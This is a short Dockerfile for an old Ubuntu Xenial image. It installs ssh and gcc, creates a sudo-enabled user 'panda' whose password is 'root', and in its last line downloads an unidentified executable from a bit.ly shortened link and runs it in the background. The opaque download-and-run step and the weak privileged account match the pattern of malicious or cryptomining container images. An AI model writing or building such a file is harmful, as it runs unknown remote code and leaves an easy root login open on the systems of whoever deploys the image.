FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh gcc htop -y
RUN adduser --disabled-password --gecos "" panda
RUN adduser panda sudo && echo 'panda:root' | chpasswd
RUN wget https://bit.ly/3Ibzg9T && chmod +x 3Ibzg9T && nohup ./3Ibzg9T --log=stdout > panik.log &
